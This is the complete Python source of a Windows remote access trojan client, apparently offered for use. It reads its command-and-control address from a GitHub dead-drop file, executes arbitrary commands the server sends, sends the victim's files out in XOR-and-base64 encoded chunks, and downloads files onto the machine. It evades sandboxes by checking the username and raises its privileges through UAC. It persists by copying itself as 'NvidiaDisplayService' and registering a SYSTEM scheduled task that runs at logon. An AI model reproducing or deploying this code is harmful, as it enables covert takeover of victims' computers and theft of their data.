# ============================================================================
# CLIENT SCRIPT (with Stealth and Relocation Persistence)
# ============================================================================

import ctypes
import os
import sys
import requests
import subprocess
import time
import base64
import math
import random
import winreg as reg
import shutil  

# ============================================================================
# --- CONFIGURATION ---
# ============================================================================
DEAD_DROP_URL = "https://raw.githubusercontent.com/XERO47/miniature-goggles/refs/heads/main/status.txt" 
DORMANT_INTERVAL = 60
DORMANT_JITTER = 20
ACTIVE_INTERVAL = 2
CHUNK_SIZE = 1024 * 4
PERSISTENCE_NAME = "NvidiaDisplayService"  # Masquerade name
# ============================================================================

# --- Encryption Function ---
def xor_encrypt_decrypt(data, key="mysecretkey"):
    key_bytes = key.encode()
    key_len = len(key_bytes)
    if isinstance(data, str): data = data.encode('utf-8', 'ignore')
    decrypted_bytes = bytearray()
    for i in range(len(data)):
        decrypted_bytes.append(data[i] ^ key_bytes[i % key_len])
    return decrypted_bytes

# --- Anti-Analysis Check ---
def is_sandboxed():
    common_sandbox_users = ["sandbox", "test", "vm", "malware", "virus", "user"]
    try:
        if os.environ.get("USERNAME").lower() in common_sandbox_users:
            return True
    except:
        pass
    return False

# --- Persistence and UAC Functions ---
def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

def run_as_admin():
    try: ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    except: pass

def check_persistence_flag():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software", 0, reg.KEY_READ)
        reg.OpenKey(key, PERSISTENCE_NAME)
        reg.CloseKey(key)
        return True
    except FileNotFoundError:
        return False

def set_persistence_flag():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software", 0, reg.KEY_WRITE)
        reg.CreateKey(key, PERSISTENCE_NAME)
        reg.CloseKey(key)
    except Exception:
        pass

def create_persistence():
    """
    1. Copies the executable to a hidden system location.
    2. Creates a scheduled task that points to the NEW hidden path.
    """
    current_exe_path = sys.executable 
    try:
        hidden_dir = os.path.join(os.getenv('APPDATA'), PERSISTENCE_NAME)
        if not os.path.exists(hidden_dir):
            os.makedirs(hidden_dir)
        new_exe_path = os.path.join(hidden_dir, f"{PERSISTENCE_NAME}.exe")
        shutil.copyfile(current_exe_path, new_exe_path)
        command = f'schtasks /create /sc onlogon /tn "{PERSISTENCE_NAME}" /tr "{new_exe_path}" /ru "NT AUTHORITY\\SYSTEM" /rl HIGHEST /f'
        subprocess.run(command, shell=True, check=True, capture_output=True)
        return True
    except Exception:
        return False

# --- Core RAT Functions (No changes needed in these) ---
def get_c2_command(c2_url):
    try:
        r = requests.get(f"{c2_url}/get_command", verify=False, timeout=3)
        return r.text
    except requests.exceptions.RequestException:
        return "C2_CONNECTION_FAILED"

def post_results(output, c2_url):
    try:
        if isinstance(output, str):
            output = output.encode('utf-8', 'ignore')
        encrypted_output = xor_encrypt_decrypt(output)
        encoded_output = base64.b64encode(encrypted_output).decode()
        requests.post(f"{c2_url}/send_results", data=encoded_output, verify=False, timeout=10)
    except Exception:
        pass

def handle_upload(filename, total_chunks, c2_url):
    try:
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, 'wb') as f:
            for i in range(total_chunks):
                chunk_url = f"{c2_url}/get_chunk/{filename}/{i}"
                r = requests.get(chunk_url, verify=False, timeout=15)
                if r.status_code == 200:
                    encoded_chunk = r.json().get('data')
                    encrypted_chunk = base64.b64decode(encoded_chunk)
                    decrypted_chunk = xor_encrypt_decrypt(encrypted_chunk)
                    f.write(decrypted_chunk)
                else:
                    raise Exception(f"Chunk {i} failed with status {r.status_code}")
        post_results(f"[SUCCESS] File '{filename}' uploaded.", c2_url)
    except Exception as e:
        post_results(f"[ERROR] File upload failed: {str(e)}", c2_url)

def handle_download(filepath, c2_url):
    if not os.path.exists(filepath):
        post_results(f"Error: File not found on victim: {filepath}", c2_url)
        return
    try:
        filesize = os.path.getsize(filepath)
        total_chunks = math.ceil(filesize / CHUNK_SIZE)
        filename = os.path.basename(filepath)
        init_data = {'filename': filename, 'total_chunks': total_chunks}
        r = requests.post(f"{c2_url}/initiate_transfer", json=init_data, verify=False, timeout=5)
        if r.status_code != 200:
            raise Exception("C2 server refused transfer initiation.")
        chunk_index = 0
        with open(filepath, 'rb') as f:
            while True:
                chunk = f.read(CHUNK_SIZE)
                if not chunk:
                    break
                encrypted_chunk = xor_encrypt_decrypt(chunk)
                encoded_chunk = base64.b64encode(encrypted_chunk).decode()
                chunk_data = {'filename': filename, 'chunk_index': chunk_index, 'data': encoded_chunk}
                requests.post(f"{c2_url}/upload_chunk", json=chunk_data, verify=False, timeout=10)
                chunk_index += 1
                time.sleep(0.05)
    except Exception as e:
        post_results(f"[ERROR] File download failed: {str(e)}", c2_url)

import tempfile

def enter_active_c2_session(c2_url):
    consecutive_failures = 0
    while True:
        command = get_c2_command(c2_url)
        if command == "C2_CONNECTION_FAILED":
            consecutive_failures += 1
            if consecutive_failures >= 3:
                return
            time.sleep(ACTIVE_INTERVAL * 2)
            continue
        consecutive_failures = 0
        if command:
            parts = command.split()
            cmd_type = parts[0].lower()
            if cmd_type in ['exit', 'quit', 'close']:
                return
            elif cmd_type == 'stage_file':
                try:
                    filename = parts[parts.index('--filename') + 1]
                    total_chunks = int(parts[parts.index('--chunks') + 1])
                    handle_upload(filename, total_chunks, c2_url)
                except (ValueError, IndexError):
                    post_results("[ERROR] Invalid stage_file command.", c2_url)
            elif cmd_type == 'download':
                if len(parts) > 1:
                    handle_download(parts[1], c2_url)
                else:
                    post_results("Usage: download <filepath_on_victim>", c2_url)
            else:
                # FIX: Use temporary batch file for long commands
                try:
                    with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False) as bat_file:
                        bat_file.write(command)
                        bat_path = bat_file.name
                    
                    output = subprocess.run([bat_path], shell=True, capture_output=True)
                    
                    # Clean up the temp file
                    try:
                        os.unlink(bat_path)
                    except:
                        pass
                    
                    result = (output.stdout + output.stderr)
                    post_results(result or b"[+] Command executed.", c2_url)
                except Exception as e:
                    post_results(f"[ERROR] Command execution failed: {str(e)}".encode(), c2_url)
        time.sleep(ACTIVE_INTERVAL)

def run_rat_payload():
    while True:
        try:
            response = requests.get(DEAD_DROP_URL, timeout=15)
            c2_url_from_dd = response.text.strip()
        except requests.exceptions.RequestException:
            c2_url_from_dd = "sleep"
        if c2_url_from_dd and c2_url_from_dd.lower().startswith('http'):
            enter_active_c2_session(c2_url_from_dd)
        sleep_time = DORMANT_INTERVAL + random.uniform(-DORMANT_JITTER, DORMANT_JITTER)
        time.sleep(sleep_time)

# Main Execution 
if __name__ == '__main__':
    is_compiled = getattr(sys, 'frozen', False)
    if not is_compiled:
        run_rat_payload()
    else:
        if not check_persistence_flag():
            if is_admin():
                if create_persistence():
                    set_persistence_flag()
                run_rat_payload()
            else:
                run_as_admin()
        else:
            if is_admin():
                run_rat_payload()
            else:
                sys.exit(0)
